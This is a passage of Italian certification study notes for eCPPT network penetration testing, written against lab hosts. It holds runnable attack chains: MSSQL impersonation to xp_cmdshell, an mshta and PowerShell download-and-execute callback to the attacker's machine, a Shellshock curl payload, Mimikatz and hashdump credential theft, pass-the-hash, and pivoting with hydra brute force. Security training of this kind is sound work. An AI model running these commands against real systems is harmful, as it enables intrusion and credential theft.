- **SMB Relay**: hash usato **live durante l'auth** (on-path).
- **Pass-the-Hash**: hash già rubato, riutilizzato per autenticarsi (`impacket-psexec -hashes :<NT> user@host`).

---

### 11.2 MSSQL DB User Impersonation → RCE

**Idea**: utente low-priv DB → cerca permission `IMPERSONATE` → catena impersonation fino a `sa` (sysadmin) → abilita `xp_cmdshell` → RCE → callback meterpreter via HTA.

**Porta**: TCP **1433**.

#### Step-by-step

```bash
# 1. Discovery & versioning
sudo nmap -sV -p 1433 demo.ine.local
sudo nmap -p 1433 --script "ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,ms-sql-brute" demo.ine.local

# 2. Login con creds note (bob)
impacket-mssqlclient bob:'Pass123!'@demo.ine.local
# Per Windows auth: impacket-mssqlclient -windows-auth ...
```

```sql
-- 3. Versione & ruolo
SELECT @@version;
SELECT IS_SRVROLEMEMBER('sysadmin');                              -- 0 = NOT sysadmin
SELECT loginname FROM master..syslogins WHERE sysadmin = 1;       -- chi è sysadmin

-- 4. Tenta xp_cmdshell direttamente (fallisce se NOT sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 5. Trova utenti impersonabili
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- 6. Catena di impersonation (bob → dbuser → sa)
EXECUTE AS LOGIN = 'dbuser';
SELECT SYSTEM_USER;            -- dbuser
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;            -- sa ✓
-- REVERT per tornare al login originale

-- 7. Abilita xp_cmdshell (ora siamo sa)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 8. RCE
EXEC xp_cmdshell 'whoami';     -- nt service\mssql$...
```

```
# 9. Listener HTA su Kali
msf6 > use exploit/windows/misc/hta_server
msf6 > set LHOST <kali>
msf6 > exploit -j
# → URL http://<kali>:8080/<random>.hta
```

```sql
-- 10. Trigger
EXEC xp_cmdshell 'mshta.exe http://<kali>:8080/abcd1234.hta';
```

```
# 11. Sessione meterpreter
meterpreter > getuid          # NT SERVICE\MSSQL$...
meterpreter > getprivs        # SeImpersonatePrivilege → Potato attacks (Juicy/Rogue/Print/God) → SYSTEM
```

**Alternativa a HTA**: PowerShell one-liner

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "I⁠EX(New-Object Net.Web⁠Client).Download⁠String(''http://<kali>/sh.ps1'')"';
```

**Privesc post-RCE**: il service account MSSQL ha tipicamente **`SeImpersonatePrivilege`** → **Potato attacks** per escalation a `NT AUTHORITY\SYSTEM` (vedi modulo Privilege Escalation).

---

### 11.3 Linux Black-Box Pentest

**Chain**: nmap → searchsploit → eGallery arbitrary upload (Metasploit) → privesc Exim 4.89 (CVE-2019-10149 "Return of the WIZard") → autoroute → portfwd → Shellshock (CVE-2014-6271) con **bind shell**.

#### Step-by-step

```bash
# Recon
sudo nmap -sV demo.ine.local
# 25/tcp open smtp     Exim smtpd 4.89
# 80/tcp open http     Apache httpd 2.4.7 (Ubuntu)

# Web app discovery
searchsploit eGallery
```

```
# Initial access (eGallery arbitrary upload)
msf6 > use exploit/unix/webapp/egallery_upload
msf6 > set LHOST <kali> ; set RHOSTS demo.ine.local ; set TARGETURI /
msf6 > exploit
# session 1 (www-data)

# Local enum
meterpreter > sysinfo
meterpreter > getuid                  # www-data

# Privesc Exim
msf6 > use exploit/linux/local/exim4_deliver_message_priv_esc
msf6 > set SESSION 1 ; set LHOST <kali> ; set LPORT 4445
msf6 > set PAYLOAD linux/x86/meter⁠preter/reverse_tcp
msf6 > exploit
# session 2 (uid=0 root)

# Discovery 2° network
meterpreter > ifconfig                # eth1 → 192.x.x.x/24

# Autoroute (pivot)
meterpreter > run autoroute -s 192.x.x.0/24
meterpreter > background

# Port scan via pivot
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.x.x.3-5 ; set PORTS 1-1024 ; run

# Port forward per accesso browser
meterpreter > portfwd add -l 1234 -p 80 -r 192.x.x.3

# Verifica Shellshock
msf6 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
msf6 > set RHOSTS 192.x.x.3 ; set TARGETURI /cgi-bin/stats ; run

# Exploit Shellshock con BIND shell (target non può iniziare connessione verso Kali)
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 > set RHOSTS 192.x.x.3 ; set TARGETURI /cgi-bin/stats
msf6 > set PAYLOAD linux/x86/meter⁠preter/bind_tcp
msf6 > set LPORT 4446
msf6 > exploit
# session 3 su demo2
```

**Shellshock manuale**:

```bash
curl -A "() { :; }; /bin/bash -c 'id'" http://target/cgi-bin/stats
```

**Bind vs Reverse shell**: usare **BIND** quando il target non può iniziare connessioni outbound (dietro NAT, pivot asimmetrico). Il target ascolta, l'attaccante si connette.

---

### 11.4 NTLM hash dump & crack

#### Concetti chiave

- **SAM** (`C:\Windows\System32\config\SAM`) = DB locale Windows con hash. Bloccato a runtime → dump da **LSASS in memoria**.
- **LSASS** (Local Security Authority Subsystem Service) = contiene hash + a volte clear-text (WDigest, Kerberos).
- **LM hash** = legacy, disabilitato da **Windows Vista** in poi (placeholder `aad3b435b51404eeaad3b435b51404ee`).
- **NT/NTLM hash** = MD4(password Unicode). Case-sensitive.
- Pre-req dump: **admin elevated** + **migrate in `lsass.exe`** (o `getsystem`).

#### Step-by-step

```bash
# Initial access (lab BadBlue Win Server 2012 R2)
sudo service postgresql start
sudo msfconsole
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set RHOSTS <target> ; set LHOST <kali>
msf6 > exploit
```

```
# Privilegi + migrate
meterpreter > sysinfo
meterpreter > getuid                    # Administrator
meterpreter > getprivs                  # SeDebugPrivilege
meterpreter > getsystem                 # NT AUTHORITY\SYSTEM
meterpreter > migrate -N lsass.exe

# Hash⁠dump nativo
meterpreter > hash⁠dump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# Bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

# Formato: username:RID:LM:NT:::
# 3° campo LM = placeholder = LM disabled
# 4° campo NT = quello da crackare

# Mimi⁠katz/Kiwi
meterpreter > load kiwi
meterpreter > kiwi_cmd "privilege::de⁠bug"
meterpreter > kiwi_cmd "sekur⁠lsa::logonpasswords"
meterpreter > creds_all

# Alternativa offline (richiede hive SAM+SYSTEM)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Alternativa remota via SMB
impacket-secretsdump administrator:password@<target>
```

#### Cracking

```bash
# John the Ripper
john --format=nt hashes.txt
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=nt hashes.txt

# Hashcat (estrai solo l'NT hash)
cut -d: -f4 hashes.txt > nt.txt
hashcat -m 1000 nt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 nt.txt rockyou.txt --show
```

#### Pass-the-Hash (no cracking necessario)

```bash
impacket-psexec -hashes :<NTHASH> administrator@<target>
# Esempio: :8846f7eaee8fb117ad06bdd830b7586c  (NT hash di "password")
```

#### Differenze NTLMv1 vs NTLMv2 vs NTLM (NT) hash

| Tipo | Cos'è | Dove si ottiene | Hashcat mode |
|---|---|---|---|
| **NT hash** (NTLM) | MD4 della password Unicode, locale | Dump SAM/LSASS | **1000** |
| **LM hash** | Legacy, MD5-based, max 14 char, no Unicode | Win pre-Vista | **3000** |
| **NetNTLMv1** | Challenge-response su rete (SMB/HTTP), DES-based | Sniff / Responder | **5500** |
| **NetNTLMv2** | Challenge-response più robusta (HMAC-MD5) | Sniff / Responder | **5600** |
| **Kerberos TGS-REP** | Ticket Kerberoasting | AD attacks | **13100** |
| **Kerberos AS-REP** | Ticket AS-REP Roasting | AD attacks | **18200** |

---

### 11.5 Windows Post-Exploitation Lab

**Chain**: Rejetto HFS RCE → `getsystem` → `enum_applications` → loot FileZilla creds → `autoroute` → `socks_proxy` (`VERSION 4a`, `SRVPORT 9050`) → `proxychains` → SSH brute via pivot.

#### Step-by-step

```bash
sudo nmap -Pn -n -sV demo.ine.local
# 80/tcp open  Rejetto HttpFileServer 2.x
```

```
# 1. Initial access
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set RHOSTS demo.ine.local ; set LHOST <kali>
msf6 > set PAYLOAD windows/x64/meter⁠preter/reverse_tcp     # 32-bit fallisce
msf6 > exploit

# 2. Privesc
meterpreter > getsystem                                    # NT AUTHORITY\SYSTEM

# 3. Discovery 2° network
meterpreter > ipconfig                                     # eth1 → 192.x.x.x/20

# 4. Autoroute (pivot)
meterpreter > run autoroute -s 192.x.x.0/20
meterpreter > background

# 5. Enum applicazioni
msf6 > use post/windows/gather/enum_applications
msf6 > set SESSION 1 ; run                                 # → FileZilla installato!

# 6. Loot creds FileZilla
msf6 > use post/windows/gather/credentials/filezilla_client
msf6 > set SESSION 1 ; run
# → host=demo1 user=admin pass=strongpassword

# 7. SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 > set VERSION 4a ; set SRVPORT 9050 ; run -j

# Verifica
ss -tnlp | grep 9050
cat /etc/proxychains4.conf       # socks4 127.0.0.1 9050
```

```bash
# 8. Scan via pivot
proxychains nmap -sT -Pn -p 1-100 demo1.ine.local
# (Nmap via proxy: usare -sT -Pn, NIENTE raw)

# 9. Brute SSH via pivot
proxychains hydra -l administrator \
  -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
  demo1.ine.local ssh

# 10. Access via pivot
proxychains ssh administrator@demo1.ine.local
```

#### Tecniche complementari di lateral

```
# Crea utente locale + aggiungi a RDP
meterpreter > shell
> net user guest_one GuestPwd123! /add
> net localgroup "Remote Desktop Users" guest_one /add
> exit

# Da Kali
xfreerdp /u:guest_one /p:GuestPwd123! /v:demo.ine.local

# Net view / net use (lateral su share Windows)
> net view \\<target>
> net use D: \\<target>\Documents
> net use K: \\<target>\K
> dir D:

# Port forward singolo servizio (alternativa più semplice al SOCKS)
meterpreter > portfwd add -l 1234 -p 22 -r demo1.ine.local
ssh administrator@127.0.0.1 -p 1234
```

#### Post-modules Metasploit chiave

| Modulo | Scopo |
|---|---|
| `post/multi/recon/local_exploit_suggester` | Suggerisce privesc exploit per la sessione |
| `post/windows/gather/enum_applications` | Software installato |
| `post/windows/gather/enum_logged_on_users` | Utenti loggati |
| `post/windows/gather/credentials/filezilla_client` | FileZilla creds |
| `post/windows/gather/credentials/<altro>` | Chrome, Firefox, Outlook, WinSCP, ... |
| `post/windows/gather/hash⁠dump` | SAM hash |
| `auxiliary/server/socks_proxy` | SOCKS pivot |

**SOCKS4a vs SOCKS5**: SOCKS5 supporta UDP + auth; SOCKS4a fa DNS via proxy. Allineare sempre `VERSION` modulo Metasploit con `/etc/proxychains4.conf`.

**Pivoting + Nmap**: NON funziona con probe raw/ICMP via proxychains → usare **`-sT -Pn`**.

---

## 12. Cheat sheet Nmap (master table)

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Nmap & Scanning](../10_Cheatsheet.md#nmap-scanning).

---



### Quiz: Attack labs (SMB Relay, MSSQL, NTLM) & Nmap master

<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="4"></div>

## 13. Cheat sheet Hashcat modes

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Hashcat — modes & cracking](../10_Cheatsheet.md#hashcat-modes-cracking).

---

## 14. Porte di riferimento

| Porta | Proto | Servizio | Note |
|---|---|---|---|
| 21 | TCP | FTP | `ftp-anon`, banner exploit (ProFTPD 1.3.3c) |
| 22 | TCP | SSH | Brute, key auth |
| 23 | TCP | Telnet | Clear-text |
| 25 | TCP | SMTP | VRFY/EXPN, open relay |
| 53 | TCP/UDP | DNS | Zone transfer, DNS spoof |
| 79 | TCP | Finger | User enum Linux legacy |
| 80 | TCP | HTTP | |
| 88 | TCP | Kerberos | AD |
| 110 | TCP | POP3 | |
| 111 | TCP | RPCbind | NFS |
| 123 | UDP | NTP | |
| 135 | TCP | MS-RPC | Endpoint mapper Win |
| **137** | **UDP** | **NetBIOS Name** | nbtscan, nmblookup |
| 138 | UDP | NetBIOS Datagram | |
| **139** | **TCP** | **NetBIOS Session (SMB over NetBIOS)** | |
| 143 | TCP | IMAP | |
| **161** | **UDP** | **SNMP** | `snmpwalk`, community string |
| 162 | UDP | SNMP Trap | |
| 389 | TCP | LDAP | AD |
| **443** | TCP | HTTPS | |
| **445** | **TCP** | **SMB direct** | psexec, smb_relay, EternalBlue |
| 500 | UDP | IKE/IPsec | |
| 587 | TCP | SMTP submission | |
| 636 | TCP | LDAPS | |
| 1080 | TCP | SOCKS proxy | |
| **1433** | **TCP** | **MSSQL** | xp_cmdshell, impersonation |
| 1434 | UDP | MSSQL Browser | |
| 2049 | TCP | NFS | |
| 3306 | TCP | MySQL | |
| **3389** | **TCP** | **RDP** | NLA, Pass-the-Hash possibile |
| 5432 | TCP | PostgreSQL | |
| **5985** | TCP | **WinRM HTTP** | Kerberos/NTLM |
| 5986 | TCP | WinRM HTTPS | |
| 6421 | TCP | (lab) MongoDB su porta non-standard | |
| 8080 | TCP | HTTP-alt | |
| 11211 | TCP/UDP | Memcached | |
| 27017 | TCP | MongoDB | |

---

## 15. Punti d'attenzione per l'esame eCPPT

### Format esame
- **45 domande multiple choice** su ambiente lab pratico.
- Niente report da consegnare.
- Tempo limitato → workflow strutturato + note ordinate.

### Aree ad alta probabilità

1. **Nmap completo**: ogni flag scan, NSE, output, timing, evasion.
2. **Enumeration SMB/SNMP** (null session, community string, NSE).
3. **SMB Relay** (pre-req signing disabled; Metasploit + ntlmrelayx).
4. **MSSQL** (xp_cmdshell, IMPERSONATE, sysadmin role).
5. **Hash dump + crack** (NTLM, Hashcat modes, John format).
6. **Pivoting Metasploit** (autoroute, socks_proxy, proxychains, portfwd).

### Concetti da memorizzare a memoria

#### Differenze chiave (domande tipiche)

| | A | B |
|---|---|---|
| `-sn` vs `-Pn` | Solo discovery | Skip discovery |
| `-sS` vs `-sT` | Half-open (no ACK) | Full handshake |
| SYN ping vs ACK ping | Atteso SYN/ACK o RST | Atteso solo RST (bypass stateless) |
| `unfiltered` vs `filtered` (sA) | Nessun firewall | Stateful firewall |
| NTLM vs NetNTLMv1/v2 | Statico nel SAM (m=1000) | Challenge-response (m=5500/5600) |
| SMB Relay vs Pass-the-Hash | Hash relayato live | Hash già rubato, riutilizzato |
| Bind vs Reverse shell | Target ascolta, attacker connette | Target inizia connessione verso attacker |
| ARP spoof vs DNS spoof | Layer 2 (MAC) | Layer 7 (risoluzione nomi) |
| SOCKS4a vs SOCKS5 | DNS via proxy, no UDP | UDP + auth, più moderno |

#### Porte da memorizzare assolutamente
21, 22, 25, 53, 79, 80, 88, **137 (UDP), 139, 161 (UDP), 162 (UDP)**, 389, 443, **445**, **1433**, 3306, **3389**, 5985, 5986.

#### Hashcat modes da memorizzare
- **1000** NTLM
- **3000** LM
- **5500** NetNTLMv1
- **5600** NetNTLMv2 (Responder!)
- **13100** Kerberos TGS (Kerberoasting)
- **18200** Kerberos AS-REP (AS-REP Roasting)

#### Comandi meterpreter chiave
`getsystem`, `migrate -N lsass.exe`, `hash⁠dump`, `load kiwi`, `creds_all`, `kiwi_cmd "sekur⁠lsa::logonpasswords"`, `run autoroute -s <subnet>`, `portfwd add -l <l> -p <r> -r <ip>`, `sysinfo`, `getuid`, `getprivs`.

#### Catena pivoting standard
`getsystem` → `run autoroute -s <subnet>` → `use auxiliary/server/socks_proxy` (`VERSION 4a`, `SRVPORT 9050`, `run -j`) → `proxychains <tool>`. Per Nmap via pivot usa **`-sT -Pn`** (niente raw).

#### Workflow Nmap completo
```bash
sudo nmap -sn <subnet>                                  # discovery
sudo nmap -Pn -sS -p- -T4 <target>                      # full TCP
sudo nmap -Pn -sU -p 53,137,138,139,161 <target>        # UDP mirato
sudo nmap -Pn -sS -sV -sC -O -p <open_ports> <target>   # version+OS+default scripts
sudo nmap -Pn --script vuln -p <ports> <target>         # vuln check
sudo nmap -Pn -sS -sV -A -T4 <target> -oA fullscan      # report
```

#### Workflow SMB enum
```bash
sudo nmap -p 139,445 -sV --script "smb-protocols,smb-security-mode" <target>
smbclient -L //<target>/ -N
enum4linux -a <target>
rpcclient -U "" -N <target>
sudo nmap -p 445 --script "smb-enum-users,smb-enum-shares" <target>
hydra -L users.txt -P rockyou.txt smb://<target>
impacket-psexec <user>:<pass>@<target>
```

#### Workflow SNMP enum
```bash
sudo nmap -sU -p 161 -sV <target>
sudo nmap -sU -p 161 --script snmp-brute <target>
sudo nmap -sU -p 161 --script "snmp-*" -oN snmp.txt <target>
snmp-check -c public -v 1 <target>
snmpwalk -v2c -c public <target>
```

### Mindset lab

- **Enum esaustivo PRIMA di exploit**. Mai saltare alla fase exploit senza aver enumerato tutto.
- **Salva sempre i risultati** (`-oA`).
- **Workspace dedicato Metasploit** per ogni engagement.
- **Combina tecniche** di discovery — mai affidarsi a una sola (ICMP + ARP + TCP + UDP).
- **`searchsploit <prodotto> <versione>`** è il primo check dopo ogni banner.
- `/cgi-bin/` URL → **red flag ShellShock**.
- **`SeImpersonatePrivilege`** sui service account → **Potato attacks** per SYSTEM.
- Banner come **"Service Info: OS: Unix"** sono indizi gratuiti per OS detection quando `-O` fallisce.

### Cosa NON è coperto in questo modulo (rimando)

- **Privilege Escalation** (Windows + Linux) → corso dedicato.
- **Lateral Movement & Pivoting avanzato** (CrackMapExec, PsExec, WinRM, SSH SOCKS, reGeorg) → corso dedicato.
- **Active Directory attacks** (Blood⁠Hound, Kerberoasting, Pass-the-Ticket, Golden/Silver Ticket) → corso dedicato.
- **Client-Side / phishing** → corso dedicato.
- **C2 frameworks** → corso dedicato.

---



### Quiz: Hashcat, porte e punti d'attenzione eCPPT

<div class="ecppt-quiz" data-module="02_Network_Penetration_Testing" data-block="5"></div>

## Indice video sorgente

| # | Video | Link |
|---|---|---|
| 01 | Course Introduction | [../Network Penetration Testing/01_Course Introduction.md](../Network%20Penetration%20Testing/01_Course%20Introduction.md) |
| 02 | Active Information Gathering | [../Network Penetration Testing/02_Active Information Gathering.md](../Network%20Penetration%20Testing/02_Active%20Information%20Gathering.md) |
| 03 | Networking Fundamentals | [../Network Penetration Testing/03_Networking Fundamentals.md](../Network%20Penetration%20Testing/03_Networking%20Fundamentals.md) |
| 04 | Network Layer | [../Network Penetration Testing/04_Network Layer.md](../Network%20Penetration%20Testing/04_Network%20Layer.md) |
| 05 | Transport Layer | [../Network Penetration Testing/05_Transport Layer.md](../Network%20Penetration%20Testing/05_Transport%20Layer.md) |
| 06 | Network Mapping | [../Network Penetration Testing/06_Network Mapping.md](../Network%20Penetration%20Testing/06_Network%20Mapping.md) |
| 07 | Host Discovery Techniques | [../Network Penetration Testing/07_Host Discovery Techniques.md](../Network%20Penetration%20Testing/07_Host%20Discovery%20Techniques.md) |
| 08 | Ping Sweeps | [../Network Penetration Testing/08_Ping Sweeps.md](../Network%20Penetration%20Testing/08_Ping%20Sweeps.md) |
| 09 | Host Discovery with Nmap - Part 1 | [../Network Penetration Testing/09_Host Discovery with Nmap - Part 1.md](../Network%20Penetration%20Testing/09_Host%20Discovery%20with%20Nmap%20-%20Part%201.md) |
| 10 | Host Discovery with Nmap - Part 2 | [../Network Penetration Testing/010_Host Discovery with Nmap - Part 2.md](../Network%20Penetration%20Testing/010_Host%20Discovery%20with%20Nmap%20-%20Part%202.md) |
| 11 | Port Scanning with Nmap | [../Network Penetration Testing/011_Port Scanning with Nmap.md](../Network%20Penetration%20Testing/011_Port%20Scanning%20with%20Nmap.md) |
| 12 | Service Version & OS Detection | [../Network Penetration Testing/012_Service Version & OS Detection.md](../Network%20Penetration%20Testing/012_Service%20Version%20%26%20OS%20Detection.md) |
| 13 | Nmap Scripting Engine (NSE) | [../Network Penetration Testing/013_Nmap Scripting Engine (NSE).md](../Network%20Penetration%20Testing/013_Nmap%20Scripting%20Engine%20%28NSE%29.md) |
| 14 | Firewall Detection & IDS Evasion | [../Network Penetration Testing/014_Firewall Detection & IDS Evasion.md](../Network%20Penetration%20Testing/014_Firewall%20Detection%20%26%20IDS%20Evasion.md) |
| 15 | Optimizing Nmap Scans | [../Network Penetration Testing/015_Optimizing Nmap Scans.md](../Network%20Penetration%20Testing/015_Optimizing%20Nmap%20Scans.md) |
| 16 | Nmap Output Formats | [../Network Penetration Testing/016_Nmap Output Formats.md](../Network%20Penetration%20Testing/016_Nmap%20Output%20Formats.md) |
| 17 | Introduction to Enumeration | [../Network Penetration Testing/017_Introduction to Enumeration.md](../Network%20Penetration%20Testing/017_Introduction%20to%20Enumeration.md) |
| 18 | SMB & NetBIOS Enumeration | [../Network Penetration Testing/018_SMB___NetBIOS_Enumeration.mp4.md](../Network%20Penetration%20Testing/018_SMB___NetBIOS_Enumeration.mp4.md) |
| 19 | SNMP Enumeration | [../Network Penetration Testing/019_SNMP_Enumeration.mp4.md](../Network%20Penetration%20Testing/019_SNMP_Enumeration.mp4.md) |
| 20 | Linux Service Enumeration | [../Network Penetration Testing/020_Linux_Service_Enumeration.mp4.md](../Network%20Penetration%20Testing/020_Linux_Service_Enumeration.mp4.md) |
| 21 | SMB Relay Attack | [../Network Penetration Testing/021_SMB_Relay_Attack.mp4.md](../Network%20Penetration%20Testing/021_SMB_Relay_Attack.mp4.md) |
| 22 | MSSQL DB User Impersonation to RCE | [../Network Penetration Testing/022_MSSQL_DB_User_Impersonation_to_RCE.mp4.md](../Network%20Penetration%20Testing/022_MSSQL_DB_User_Impersonation_to_RCE.mp4.md) |
| 23 | Linux Black-Box Penetration Test | [../Network Penetration Testing/023_Linux_Black-Box_Penetration_Test.mp4.md](../Network%20Penetration%20Testing/023_Linux_Black-Box_Penetration_Test.mp4.md) |
| 24 | Dumping & Cracking NTLM Hashes | [../Network Penetration Testing/024_Dumping___Cracking_NTLM_Hashes.mp4.md](../Network%20Penetration%20Testing/024_Dumping___Cracking_NTLM_Hashes.mp4.md) |
| 25 | Windows Post-Exploitation Lab | [../Network Penetration Testing/025_Windows_Post-Exploitation_Lab.mp4.md](../Network%20Penetration%20Testing/025_Windows_Post-Exploitation_Lab.mp4.md) |
| 26 | Course Conclusion | [../Network Penetration Testing/026_Course Conclusion_1717745829269.md](../Network%20Penetration%20Testing/026_Course%20Conclusion_1717745829269.md) |
